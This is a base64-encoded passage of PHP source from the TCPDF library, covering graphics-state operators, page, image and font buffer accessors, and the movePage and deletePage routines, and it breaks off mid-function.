CQkJJHRoaXMtPmggPSAkZ3ZhcnNbJ2gnXTsKCQkJJHRoaXMtPndQdCA9ICRndmFyc1snd1B0J107CgkJCSR0aGlzLT5oUHQgPSAkZ3ZhcnNbJ2hQdCddOwoJCQkkdGhpcy0+ZndQdCA9ICRndmFyc1snZndQdCddOwoJCQkkdGhpcy0+ZmhQdCA9ICRndmFyc1snZmhQdCddOwoJCQkkdGhpcy0+cGFnZSA9ICRndmFyc1sncGFnZSddOwoJCQkkdGhpcy0+Y3VycmVudF9jb2x1bW4gPSAkZ3ZhcnNbJ2N1cnJlbnRfY29sdW1uJ107CgkJCSR0aGlzLT5udW1fY29sdW1ucyA9ICRndmFyc1snbnVtX2NvbHVtbnMnXTsKCQl9CgkJJHRoaXMtPl9vdXQoJycuJHRoaXMtPmxpbmVzdHlsZVdpZHRoLicgJy4kdGhpcy0+bGluZXN0eWxlQ2FwLicgJy4kdGhpcy0+bGluZXN0eWxlSm9pbi4nICcuJHRoaXMtPmxpbmVzdHlsZURhc2guJyAnLiR0aGlzLT5EcmF3Q29sb3IuJyAnLiR0aGlzLT5GaWxsQ29sb3IuJycpOwoJCWlmICghVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHRoaXMtPkZvbnRGYW1pbHkpKSB7CgkJCSR0aGlzLT5zZXRGb250KCR0aGlzLT5Gb250RmFtaWx5LCAkdGhpcy0+Rm9udFN0eWxlLCAkdGhpcy0+Rm9udFNpemVQdCk7CgkJfQoJfQoKCS8qKgoJICogT3V0cHV0cyB0aGUgInNhdmUgZ3JhcGhpY3Mgc3RhdGUiIG9wZXJhdG9yICdxJwoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gX291dFNhdmVHcmFwaGljc1N0YXRlKCkgewoJCSR0aGlzLT5fb3V0KCdxJyk7Cgl9CgoJLyoqCgkgKiBPdXRwdXRzIHRoZSAicmVzdG9yZSBncmFwaGljcyBzdGF0ZSIgb3BlcmF0b3IgJ1EnCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBfb3V0UmVzdG9yZUdyYXBoaWNzU3RhdGUoKSB7CgkJJHRoaXMtPl9vdXQoJ1EnKTsKCX0KCgkvKioKCSAqIFNldCBidWZmZXIgY29udGVudCAoYWx3YXlzIGFwcGVuZCBkYXRhKS4KCSAqIEBwYXJhbSBzdHJpbmcgJGRhdGEgZGF0YQoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuNS4wMDAgKDIwMDktMDEtMDIpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBzZXRCdWZmZXIoJGRhdGEpIHsKCQkkdGhpcy0+YnVmZmVybGVuICs9IHN0cmxlbigkZGF0YSk7CgkJJHRoaXMtPmJ1ZmZlciAuPSAkZGF0YTsKCX0KCgkvKioKCSAqIFJlcGxhY2UgdGhlIGJ1ZmZlciBjb250ZW50CgkgKiBAcGFyYW0gc3RyaW5nICRkYXRhIGRhdGEKCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA1LjUuMDAwICgyMDEwLTA2LTIyKQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gcmVwbGFjZUJ1ZmZlcigkZGF0YSkgewoJCSR0aGlzLT5idWZmZXJsZW4gPSBzdHJsZW4oJGRhdGEpOwoJCSR0aGlzLT5idWZmZXIgPSAkZGF0YTsKCX0KCgkvKioKCSAqIEdldCBidWZmZXIgY29udGVudC4KCSAqIEByZXR1cm4gc3RyaW5nIGJ1ZmZlciBjb250ZW50CgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC41LjAwMCAoMjAwOS0wMS0wMikKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIGdldEJ1ZmZlcigpIHsKCQlyZXR1cm4gJHRoaXMtPmJ1ZmZlcjsKCX0KCgkvKioKCSAqIFNldCBwYWdlIGJ1ZmZlciBjb250ZW50LgoJICogQHBhcmFtIGludCAkcGFnZSBwYWdlIG51bWJlcgoJICogQHBhcmFtIHN0cmluZyAkZGF0YSBwYWdlIGRhdGEKCSAqIEBwYXJhbSBib29sZWFuICRhcHBlbmQgaWYgdHJ1ZSBhcHBlbmQgZGF0YSwgZmFsc2UgcmVwbGFjZS4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjUuMDAwICgyMDA4LTEyLTMxKQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gc2V0UGFnZUJ1ZmZlcigkcGFnZSwgJGRhdGEsICRhcHBlbmQ9ZmFsc2UpIHsKCQlpZiAoJGFwcGVuZCkgewoJCQkkdGhpcy0+cGFnZXNbJHBhZ2VdIC49ICRkYXRhOwoJCX0gZWxzZSB7CgkJCSR0aGlzLT5wYWdlc1skcGFnZV0gPSAkZGF0YTsKCQl9CgkJaWYgKCRhcHBlbmQgQU5EIGlzc2V0KCR0aGlzLT5wYWdlbGVuWyRwYWdlXSkpIHsKCQkJJHRoaXMtPnBhZ2VsZW5bJHBhZ2VdICs9IHN0cmxlbigkZGF0YSk7CgkJfSBlbHNlIHsKCQkJJHRoaXMtPnBhZ2VsZW5bJHBhZ2VdID0gc3RybGVuKCRkYXRhKTsKCQl9Cgl9CgoJLyoqCgkgKiBHZXQgcGFnZSBidWZmZXIgY29udGVudC4KCSAqIEBwYXJhbSBpbnQgJHBhZ2UgcGFnZSBudW1iZXIKCSAqIEByZXR1cm4gc3RyaW5nIHBhZ2UgYnVmZmVyIGNvbnRlbnQgb3IgZmFsc2UgaW4gY2FzZSBvZiBlcnJvcgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuNS4wMDAgKDIwMDgtMTItMzEpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBnZXRQYWdlQnVmZmVyKCRwYWdlKSB7CgkJaWYgKGlzc2V0KCR0aGlzLT5wYWdlc1skcGFnZV0pKSB7CgkJCXJldHVybiAkdGhpcy0+cGFnZXNbJHBhZ2VdOwoJCX0KCQlyZXR1cm4gZmFsc2U7Cgl9CgoJLyoqCgkgKiBTZXQgaW1hZ2UgYnVmZmVyIGNvbnRlbnQuCgkgKiBAcGFyYW0gc3RyaW5nICRpbWFnZSBpbWFnZSBrZXkKCSAqIEBwYXJhbSBhcnJheSAkZGF0YSBpbWFnZSBkYXRhCgkgKiBAcmV0dXJuIGludCBpbWFnZSBpbmRleCBudW1iZXIKCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjUuMDAwICgyMDA4LTEyLTMxKQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gc2V0SW1hZ2VCdWZmZXIoJGltYWdlLCAkZGF0YSkgewoJCWlmICgoJGRhdGFbJ2knXSA9IGFycmF5X3NlYXJjaCgkaW1hZ2UsICR0aGlzLT5pbWFnZWtleXMpKSA9PT0gRkFMU0UpIHsKCQkJJHRoaXMtPmltYWdla2V5c1skdGhpcy0+bnVtaW1hZ2VzXSA9ICRpbWFnZTsKCQkJJGRhdGFbJ2knXSA9ICR0aGlzLT5udW1pbWFnZXM7CgkJCSsrJHRoaXMtPm51bWltYWdlczsKCQl9CgkJJHRoaXMtPmltYWdlc1skaW1hZ2VdID0gJGRhdGE7CgkJcmV0dXJuICRkYXRhWydpJ107Cgl9CgoJLyoqCgkgKiBTZXQgaW1hZ2UgYnVmZmVyIGNvbnRlbnQgZm9yIGEgc3BlY2lmaWVkIHN1Yi1rZXkuCgkgKiBAcGFyYW0gc3RyaW5nICRpbWFnZSBpbWFnZSBrZXkKCSAqIEBwYXJhbSBzdHJpbmcgJGtleSBpbWFnZSBzdWIta2V5CgkgKiBAcGFyYW0gYXJyYXkgJGRhdGEgaW1hZ2UgZGF0YQoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuNS4wMDAgKDIwMDgtMTItMzEpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBzZXRJbWFnZVN1YkJ1ZmZlcigkaW1hZ2UsICRrZXksICRkYXRhKSB7CgkJaWYgKCFpc3NldCgkdGhpcy0+aW1hZ2VzWyRpbWFnZV0pKSB7CgkJCSR0aGlzLT5zZXRJbWFnZUJ1ZmZlcigkaW1hZ2UsIGFycmF5KCkpOwoJCX0KCQkkdGhpcy0+aW1hZ2VzWyRpbWFnZV1bJGtleV0gPSAkZGF0YTsKCX0KCgkvKioKCSAqIEdldCBpbWFnZSBidWZmZXIgY29udGVudC4KCSAqIEBwYXJhbSBzdHJpbmcgJGltYWdlIGltYWdlIGtleQoJICogQHJldHVybiBzdHJpbmd8ZmFsc2UgaW1hZ2UgYnVmZmVyIGNvbnRlbnQgb3IgZmFsc2UgaW4gY2FzZSBvZiBlcnJvcgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuNS4wMDAgKDIwMDgtMTItMzEpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBnZXRJbWFnZUJ1ZmZlcigkaW1hZ2UpIHsKCQlpZiAoaXNzZXQoJHRoaXMtPmltYWdlc1skaW1hZ2VdKSkgewoJCQlyZXR1cm4gJHRoaXMtPmltYWdlc1skaW1hZ2VdOwoJCX0KCQlyZXR1cm4gZmFsc2U7Cgl9CgoJLyoqCgkgKiBTZXQgZm9udCBidWZmZXIgY29udGVudC4KCSAqIEBwYXJhbSBzdHJpbmcgJGZvbnQgZm9udCBrZXkKCSAqIEBwYXJhbSBhcnJheSAkZGF0YSBmb250IGRhdGEKCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjUuMDAwICgyMDA5LTAxLTAyKQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gc2V0Rm9udEJ1ZmZlcigkZm9udCwgJGRhdGEpIHsKCQkkdGhpcy0+Zm9udHNbJGZvbnRdID0gJGRhdGE7CgkJaWYgKCFpbl9hcnJheSgkZm9udCwgJHRoaXMtPmZvbnRrZXlzKSkgewoJCQkkdGhpcy0+Zm9udGtleXNbXSA9ICRmb250OwoJCQkvLyBzdG9yZSBvYmplY3QgSUQgZm9yIGN1cnJlbnQgZm9udAoJCQkrKyR0aGlzLT5uOwoJCQkkdGhpcy0+Zm9udF9vYmpfaWRzWyRmb250XSA9ICR0aGlzLT5uOwoJCQkkdGhpcy0+c2V0Rm9udFN1YkJ1ZmZlcigkZm9udCwgJ24nLCAkdGhpcy0+bik7CgkJfQoJfQoKCS8qKgoJICogU2V0IGZvbnQgYnVmZmVyIGNvbnRlbnQuCgkgKiBAcGFyYW0gc3RyaW5nICRmb250IGZvbnQga2V5CgkgKiBAcGFyYW0gc3RyaW5nICRrZXkgZm9udCBzdWIta2V5CgkgKiBAcGFyYW0gbWl4ZWQgJGRhdGEgZm9udCBkYXRhCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC41LjAwMCAoMjAwOS0wMS0wMikKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIHNldEZvbnRTdWJCdWZmZXIoJGZvbnQsICRrZXksICRkYXRhKSB7CgkJaWYgKCFpc3NldCgkdGhpcy0+Zm9udHNbJGZvbnRdKSkgewoJCQkkdGhpcy0+c2V0Rm9udEJ1ZmZlcigkZm9udCwgYXJyYXkoKSk7CgkJfQoJCSR0aGlzLT5mb250c1skZm9udF1bJGtleV0gPSAkZGF0YTsKCX0KCgkvKioKCSAqIEdldCBmb250IGJ1ZmZlciBjb250ZW50LgoJICogQHBhcmFtIHN0cmluZyAkZm9udCBmb250IGtleQoJICogQHJldHVybiBzdHJpbmd8ZmFsc2UgZm9udCBidWZmZXIgY29udGVudCBvciBmYWxzZSBpbiBjYXNlIG9mIGVycm9yCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC41LjAwMCAoMjAwOS0wMS0wMikKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIGdldEZvbnRCdWZmZXIoJGZvbnQpIHsKCQlpZiAoaXNzZXQoJHRoaXMtPmZvbnRzWyRmb250XSkpIHsKCQkJcmV0dXJuICR0aGlzLT5mb250c1skZm9udF07CgkJfQoJCXJldHVybiBmYWxzZTsKCX0KCgkvKioKCSAqIE1vdmUgYSBwYWdlIHRvIGEgcHJldmlvdXMgcG9zaXRpb24uCgkgKiBAcGFyYW0gaW50ICRmcm9tcGFnZSBudW1iZXIgb2YgdGhlIHNvdXJjZSBwYWdlCgkgKiBAcGFyYW0gaW50ICR0b3BhZ2UgbnVtYmVyIG9mIHRoZSBkZXN0aW5hdGlvbiBwYWdlIChtdXN0IGJlIGxlc3MgdGhhbiAkZnJvbXBhZ2UpCgkgKiBAcmV0dXJuIGJvb2wgdHJ1ZSBpbiBjYXNlIG9mIHN1Y2Nlc3MsIGZhbHNlIGluIGNhc2Ugb2YgZXJyb3IuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNC41LjAwMCAoMjAwOS0wMS0wMikKCSAqLwoJcHVibGljIGZ1bmN0aW9uIG1vdmVQYWdlKCRmcm9tcGFnZSwgJHRvcGFnZSkgewoJCWlmICgoJGZyb21wYWdlID4gJHRoaXMtPm51bXBhZ2VzKSBPUiAoJGZyb21wYWdlIDw9ICR0b3BhZ2UpKSB7CgkJCXJldHVybiBmYWxzZTsKCQl9CgkJaWYgKCRmcm9tcGFnZSA9PSAkdGhpcy0+cGFnZSkgewoJCQkvLyBjbG9zZSB0aGUgcGFnZSBiZWZvcmUgbW92aW5nIGl0CgkJCSR0aGlzLT5lbmRQYWdlKCk7CgkJfQoJCS8vIG1vdmUgYWxsIHBhZ2UtcmVsYXRlZCBzdGF0ZXMKCQkkdG1wcGFnZSA9ICR0aGlzLT5nZXRQYWdlQnVmZmVyKCRmcm9tcGFnZSk7CgkJJHRtcHBhZ2VkaW0gPSAkdGhpcy0+cGFnZWRpbVskZnJvbXBhZ2VdOwoJCSR0bXBwYWdlbGVuID0gJHRoaXMtPnBhZ2VsZW5bJGZyb21wYWdlXTsKCQkkdG1waW50bXJrID0gJHRoaXMtPmludG1ya1skZnJvbXBhZ2VdOwoJCSR0bXBib3JkZXJtcmsgPSAkdGhpcy0+Ym9yZGVybXJrWyRmcm9tcGFnZV07CgkJJHRtcGNudG1yayA9ICR0aGlzLT5jbnRtcmtbJGZyb21wYWdlXTsKCQkkdG1wcGFnZW9iamVjdHMgPSAkdGhpcy0+cGFnZW9iamVjdHNbJGZyb21wYWdlXTsKCQlpZiAoaXNzZXQoJHRoaXMtPmZvb3RlcnBvc1skZnJvbXBhZ2VdKSkgewoJCQkkdG1wZm9vdGVycG9zID0gJHRoaXMtPmZvb3RlcnBvc1skZnJvbXBhZ2VdOwoJCX0KCQlpZiAoaXNzZXQoJHRoaXMtPmZvb3RlcmxlblskZnJvbXBhZ2VdKSkgewoJCQkkdG1wZm9vdGVybGVuID0gJHRoaXMtPmZvb3RlcmxlblskZnJvbXBhZ2VdOwoJCX0KCQlpZiAoaXNzZXQoJHRoaXMtPnRyYW5zZm1ya1skZnJvbXBhZ2VdKSkgewoJCQkkdG1wdHJhbnNmbXJrID0gJHRoaXMtPnRyYW5zZm1ya1skZnJvbXBhZ2VdOwoJCX0KCQlpZiAoaXNzZXQoJHRoaXMtPlBhZ2VBbm5vdHNbJGZyb21wYWdlXSkpIHsKCQkJJHRtcGFubm90cyA9ICR0aGlzLT5QYWdlQW5ub3RzWyRmcm9tcGFnZV07CgkJfQoJCWlmIChpc3NldCgkdGhpcy0+bmV3cGFnZWdyb3VwKSBBTkQgIWVtcHR5KCR0aGlzLT5uZXdwYWdlZ3JvdXApKSB7CgkJCWZvciAoJGkgPSAkZnJvbXBhZ2U7ICRpID4gJHRvcGFnZTsgLS0kaSkgewoJCQkJaWYgKGlzc2V0KCR0aGlzLT5uZXdwYWdlZ3JvdXBbJGldKSBBTkQgKCgkaSArICR0aGlzLT5wYWdlZ3JvdXBzWyR0aGlzLT5uZXdwYWdlZ3JvdXBbJGldXSkgPiAkZnJvbXBhZ2UpKSB7CgkJCQkJLS0kdGhpcy0+cGFnZWdyb3Vwc1skdGhpcy0+bmV3cGFnZWdyb3VwWyRpXV07CgkJCQkJYnJlYWs7CgkJCQl9CgkJCX0KCQkJZm9yICgkaSA9ICR0b3BhZ2U7ICRpID4gMDsgLS0kaSkgewoJCQkJaWYgKGlzc2V0KCR0aGlzLT5uZXdwYWdlZ3JvdXBbJGldKSBBTkQgKCgkaSArICR0aGlzLT5wYWdlZ3JvdXBzWyR0aGlzLT5uZXdwYWdlZ3JvdXBbJGldXSkgPiAkdG9wYWdlKSkgewoJCQkJCSsrJHRoaXMtPnBhZ2Vncm91cHNbJHRoaXMtPm5ld3BhZ2Vncm91cFskaV1dOwoJCQkJCWJyZWFrOwoJCQkJfQoJCQl9CgkJfQoJCWZvciAoJGkgPSAkZnJvbXBhZ2U7ICRpID4gJHRvcGFnZTsgLS0kaSkgewoJCQkkaiA9ICRpIC0gMTsKCQkJLy8gc2hpZnQgcGFnZXMgZG93bgoJCQkkdGhpcy0+c2V0UGFnZUJ1ZmZlcigkaSwgJHRoaXMtPmdldFBhZ2VCdWZmZXIoJGopKTsKCQkJJHRoaXMtPnBhZ2VkaW1bJGldID0gJHRoaXMtPnBhZ2VkaW1bJGpdOwoJCQkkdGhpcy0+cGFnZWxlblskaV0gPSAkdGhpcy0+cGFnZWxlblskal07CgkJCSR0aGlzLT5pbnRtcmtbJGldID0gJHRoaXMtPmludG1ya1skal07CgkJCSR0aGlzLT5ib3JkZXJtcmtbJGldID0gJHRoaXMtPmJvcmRlcm1ya1skal07CgkJCSR0aGlzLT5jbnRtcmtbJGldID0gJHRoaXMtPmNudG1ya1skal07CgkJCSR0aGlzLT5wYWdlb2JqZWN0c1skaV0gPSAkdGhpcy0+cGFnZW9iamVjdHNbJGpdOwoJCQlpZiAoaXNzZXQoJHRoaXMtPmZvb3RlcnBvc1skal0pKSB7CgkJCQkkdGhpcy0+Zm9vdGVycG9zWyRpXSA9ICR0aGlzLT5mb290ZXJwb3NbJGpdOwoJCQl9IGVsc2VpZiAoaXNzZXQoJHRoaXMtPmZvb3RlcnBvc1skaV0pKSB7CgkJCQl1bnNldCgkdGhpcy0+Zm9vdGVycG9zWyRpXSk7CgkJCX0KCQkJaWYgKGlzc2V0KCR0aGlzLT5mb290ZXJsZW5bJGpdKSkgewoJCQkJJHRoaXMtPmZvb3RlcmxlblskaV0gPSAkdGhpcy0+Zm9vdGVybGVuWyRqXTsKCQkJfSBlbHNlaWYgKGlzc2V0KCR0aGlzLT5mb290ZXJsZW5bJGldKSkgewoJCQkJdW5zZXQoJHRoaXMtPmZvb3RlcmxlblskaV0pOwoJCQl9CgkJCWlmIChpc3NldCgkdGhpcy0+dHJhbnNmbXJrWyRqXSkpIHsKCQkJCSR0aGlzLT50cmFuc2ZtcmtbJGldID0gJHRoaXMtPnRyYW5zZm1ya1skal07CgkJCX0gZWxzZWlmIChpc3NldCgkdGhpcy0+dHJhbnNmbXJrWyRpXSkpIHsKCQkJCXVuc2V0KCR0aGlzLT50cmFuc2ZtcmtbJGldKTsKCQkJfQoJCQlpZiAoaXNzZXQoJHRoaXMtPlBhZ2VBbm5vdHNbJGpdKSkgewoJCQkJJHRoaXMtPlBhZ2VBbm5vdHNbJGldID0gJHRoaXMtPlBhZ2VBbm5vdHNbJGpdOwoJCQl9IGVsc2VpZiAoaXNzZXQoJHRoaXMtPlBhZ2VBbm5vdHNbJGldKSkgewoJCQkJdW5zZXQoJHRoaXMtPlBhZ2VBbm5vdHNbJGldKTsKCQkJfQoJCQlpZiAoaXNzZXQoJHRoaXMtPm5ld3BhZ2Vncm91cFskal0pKSB7CgkJCQkkdGhpcy0+bmV3cGFnZWdyb3VwWyRpXSA9ICR0aGlzLT5uZXdwYWdlZ3JvdXBbJGpdOwoJCQkJdW5zZXQoJHRoaXMtPm5ld3BhZ2Vncm91cFskal0pOwoJCQl9CgkJCWlmICgkdGhpcy0+Y3VycnBhZ2Vncm91cCA9PSAkaikgewoJCQkJJHRoaXMtPmN1cnJwYWdlZ3JvdXAgPSAkaTsKCQkJfQoJCX0KCQkkdGhpcy0+c2V0UGFnZUJ1ZmZlcigkdG9wYWdlLCAkdG1wcGFnZSk7CgkJJHRoaXMtPnBhZ2VkaW1bJHRvcGFnZV0gPSAkdG1wcGFnZWRpbTsKCQkkdGhpcy0+cGFnZWxlblskdG9wYWdlXSA9ICR0bXBwYWdlbGVuOwoJCSR0aGlzLT5pbnRtcmtbJHRvcGFnZV0gPSAkdG1waW50bXJrOwoJCSR0aGlzLT5ib3JkZXJtcmtbJHRvcGFnZV0gPSAkdG1wYm9yZGVybXJrOwoJCSR0aGlzLT5jbnRtcmtbJHRvcGFnZV0gPSAkdG1wY250bXJrOwoJCSR0aGlzLT5wYWdlb2JqZWN0c1skdG9wYWdlXSA9ICR0bXBwYWdlb2JqZWN0czsKCQlpZiAoaXNzZXQoJHRtcGZvb3RlcnBvcykpIHsKCQkJJHRoaXMtPmZvb3RlcnBvc1skdG9wYWdlXSA9ICR0bXBmb290ZXJwb3M7CgkJfSBlbHNlaWYgKGlzc2V0KCR0aGlzLT5mb290ZXJwb3NbJHRvcGFnZV0pKSB7CgkJCXVuc2V0KCR0aGlzLT5mb290ZXJwb3NbJHRvcGFnZV0pOwoJCX0KCQlpZiAoaXNzZXQoJHRtcGZvb3RlcmxlbikpIHsKCQkJJHRoaXMtPmZvb3RlcmxlblskdG9wYWdlXSA9ICR0bXBmb290ZXJsZW47CgkJfSBlbHNlaWYgKGlzc2V0KCR0aGlzLT5mb290ZXJsZW5bJHRvcGFnZV0pKSB7CgkJCXVuc2V0KCR0aGlzLT5mb290ZXJsZW5bJHRvcGFnZV0pOwoJCX0KCQlpZiAoaXNzZXQoJHRtcHRyYW5zZm1yaykpIHsKCQkJJHRoaXMtPnRyYW5zZm1ya1skdG9wYWdlXSA9ICR0bXB0cmFuc2Ztcms7CgkJfSBlbHNlaWYgKGlzc2V0KCR0aGlzLT50cmFuc2ZtcmtbJHRvcGFnZV0pKSB7CgkJCXVuc2V0KCR0aGlzLT50cmFuc2ZtcmtbJHRvcGFnZV0pOwoJCX0KCQlpZiAoaXNzZXQoJHRtcGFubm90cykpIHsKCQkJJHRoaXMtPlBhZ2VBbm5vdHNbJHRvcGFnZV0gPSAkdG1wYW5ub3RzOwoJCX0gZWxzZWlmIChpc3NldCgkdGhpcy0+UGFnZUFubm90c1skdG9wYWdlXSkpIHsKCQkJdW5zZXQoJHRoaXMtPlBhZ2VBbm5vdHNbJHRvcGFnZV0pOwoJCX0KCQkvLyBhZGp1c3Qgb3V0bGluZXMKCQkkdG1wb3V0bGluZXMgPSAkdGhpcy0+b3V0bGluZXM7CgkJZm9yZWFjaCAoJHRtcG91dGxpbmVzIGFzICRrZXkgPT4gJG91dGxpbmUpIHsKCQkJaWYgKCEkb3V0bGluZVsnZiddKSB7CgkJCQlpZiAoKCRvdXRsaW5lWydwJ10gPj0gJHRvcGFnZSkgQU5EICgkb3V0bGluZVsncCddIDwgJGZyb21wYWdlKSkgewoJCQkJCSR0aGlzLT5vdXRsaW5lc1ska2V5XVsncCddID0gKCRvdXRsaW5lWydwJ10gKyAxKTsKCQkJCX0gZWxzZWlmICgkb3V0bGluZVsncCddID09ICRmcm9tcGFnZSkgewoJCQkJCSR0aGlzLT5vdXRsaW5lc1ska2V5XVsncCddID0gJHRvcGFnZTsKCQkJCX0KCQkJfQoJCX0KCQkvLyBhZGp1c3QgZGVzdHMKCQkkdG1wZGVzdHMgPSAkdGhpcy0+ZGVzdHM7CgkJZm9yZWFjaCAoJHRtcGRlc3RzIGFzICRrZXkgPT4gJGRlc3QpIHsKCQkJaWYgKCEkZGVzdFsnZiddKSB7CgkJCQlpZiAoKCRkZXN0WydwJ10gPj0gJHRvcGFnZSkgQU5EICgkZGVzdFsncCddIDwgJGZyb21wYWdlKSkgewoJCQkJCSR0aGlzLT5kZXN0c1ska2V5XVsncCddID0gKCRkZXN0WydwJ10gKyAxKTsKCQkJCX0gZWxzZWlmICgkZGVzdFsncCddID09ICRmcm9tcGFnZSkgewoJCQkJCSR0aGlzLT5kZXN0c1ska2V5XVsncCddID0gJHRvcGFnZTsKCQkJCX0KCQkJfQoJCX0KCQkvLyBhZGp1c3QgbGlua3MKCQkkdG1wbGlua3MgPSAkdGhpcy0+bGlua3M7CgkJZm9yZWFjaCAoJHRtcGxpbmtzIGFzICRrZXkgPT4gJGxpbmspIHsKCQkJaWYgKCEkbGlua1snZiddKSB7CgkJCQlpZiAoKCRsaW5rWydwJ10gPj0gJHRvcGFnZSkgQU5EICgkbGlua1sncCddIDwgJGZyb21wYWdlKSkgewoJCQkJCSR0aGlzLT5saW5rc1ska2V5XVsncCddID0gKCRsaW5rWydwJ10gKyAxKTsKCQkJCX0gZWxzZWlmICgkbGlua1sncCddID09ICRmcm9tcGFnZSkgewoJCQkJCSR0aGlzLT5saW5rc1ska2V5XVsncCddID0gJHRvcGFnZTsKCQkJCX0KCQkJfQoJCX0KCQkvLyBhZGp1c3QgamF2YXNjcmlwdAoJCSRqZnJvbXBhZ2UgPSAkZnJvbXBhZ2U7CgkJJGp0b3BhZ2UgPSAkdG9wYWdlOwoJCWlmIChwcmVnX21hdGNoX2FsbCgnL3RoaXNcLmFkZEZpZWxkXChcJyhbXlwnXSopXCcsXCcoW15cJ10qKVwnLChbMC05XSspLycsICR0aGlzLT5qYXZhc2NyaXB0LCAkcGFtYXRjaCkgPiAwKSB7CgkJCWZvcmVhY2goJHBhbWF0Y2hbMF0gYXMgJHBrID0+ICRwbWF0Y2gpIHsKCQkJCSRwYWdlbnVtID0gaW50dmFsKCRwYW1hdGNoWzNdWyRwa10pICsgMTsKCQkJCWlmICgoJHBhZ2VudW0gPj0gJGp0b3BhZ2UpIEFORCAoJHBhZ2VudW0gPCAkamZyb21wYWdlKSkgewoJCQkJCSRuZXdwYWdlID0gKCRwYWdlbnVtICsgMSk7CgkJCQl9IGVsc2VpZiAoJHBhZ2VudW0gPT0gJGpmcm9tcGFnZSkgewoJCQkJCSRuZXdwYWdlID0gJGp0b3BhZ2U7CgkJCQl9IGVsc2UgewoJCQkJCSRuZXdwYWdlID0gJHBhZ2VudW07CgkJCQl9CgkJCQktLSRuZXdwYWdlOwoJCQkJJG5ld2pzID0gInRoaXMuYWRkRmllbGQoXCciLiRwYW1hdGNoWzFdWyRwa10uIlwnLFwnIi4kcGFtYXRjaFsyXVskcGtdLiJcJywiLiRuZXdwYWdlOwoJCQkJJHRoaXMtPmphdmFzY3JpcHQgPSBzdHJfcmVwbGFjZSgkcG1hdGNoLCAkbmV3anMsICR0aGlzLT5qYXZhc2NyaXB0KTsKCQkJfQoJCQl1bnNldCgkcGFtYXRjaCk7CgkJfQoJCS8vIHJldHVybiB0byBsYXN0IHBhZ2UKCQkkdGhpcy0+bGFzdFBhZ2UodHJ1ZSk7CgkJcmV0dXJuIHRydWU7Cgl9CgoJLyoqCgkgKiBSZW1vdmUgdGhlIHNwZWNpZmllZCBwYWdlLgoJICogQHBhcmFtIGludCAkcGFnZSBwYWdlIHRvIHJlbW92ZQoJICogQHJldHVybiBib29sIHRydWUgaW4gY2FzZSBvZiBzdWNjZXNzLCBmYWxzZSBpbiBjYXNlIG9mIGVycm9yLgoJICogQHB1YmxpYwoJICogQHNpbmNlIDQuNi4wMDQgKDIwMDktMDQtMjMpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBkZWxldGVQYWdlKCRwYWdlKSB7CgkJaWYgKCgkcGFnZSA8IDEpIE9SICgkcGFnZSA+ICR0aGlzLT5udW1wYWdlcykpIHsKCQkJcmV0dXJuIGZhbHNlOwoJCX0KCQkvLyBkZWxldGUgY3VycmVudCBwYWdlCgkJdW5zZXQoJHRoaXMtPnBhZ2VzWyRwYWdlXSk7CgkJdW5zZXQoJHRoaXMtPnBhZ2VkaW1bJHBhZ2VdKTsKCQl1bnNldCgkdGhpcy0+cGFnZWxlblskcGFnZV0pOwoJCXVuc2V0KCR0aGlzLT5pbnRtcmtbJHBhZ2VdKTsKCQl1bnNldCgkdGhpcy0+Ym9yZGVybXJrWyRwYWdlXSk7CgkJdW5zZXQoJHRoaXMtPmNudG1ya1skcGFnZV0pOwoJCWZvcmVhY2ggKCR0aGlzLT5wYWdlb2JqZWN0c1skcGFnZV0gYXMgJG9pZCkgewoJCQlpZiAoaXNzZXQoJHRoaXMtPm9mZnNldHNbJG9pZF0pKXsKCQkJCXVuc2V0KCR0aGlzLT5vZmZzZXRzWyRvaWRdKTsKCQkJfQoJCX0KCQl1bnNldCgkdGhpcy0+cGFnZW9iamVjdHNbJHBhZ2VdKTsKCQlpZiAoaXNzZXQoJHRoaXMtPmZvb3RlcnBvc1skcGFnZV0pKSB7CgkJCXVuc2V0KCR0aGlzLT5mb290ZXJwb3NbJHBhZ2VdKTsKCQl9CgkJaWYgKGlzc2V0KCR0aGlzLT5mb290ZXJsZW5bJHBhZ2VdKSkgewoJCQl1bnNldCgkdGhpcy0+Zm9vdGVybGVuWyRwYWdlXSk7CgkJfQoJCWlmIChpc3NldCgkdGhpcy0+dHJhbnNmbXJrWyRwYWdlXSkpIHsKCQkJdW5zZXQoJHRoaXMtPnRyYW5zZm1ya1skcGFnZV0pOwoJCX0KCQlpZiAoaXNzZXQoJHRoaXMtPlBhZ2VBbm5vdHNbJHBhZ2VdKSkgewoJCQl1bnNldCgkdGhpcy0+UGFnZUFubm90c1skcGFnZV0pOwoJCX0KCQlpZiAoaXNzZXQoJHRoaXMtPm5ld3BhZ2Vncm91cCkgQU5EICFlbXB0eSgkdGhpcy0+bmV3cGFnZWdyb3VwKSkgewoJCQlmb3IgKCRpID0gJHBhZ2U7ICRpID4gMDsgLS0kaSkgewoJCQkJaWYgKG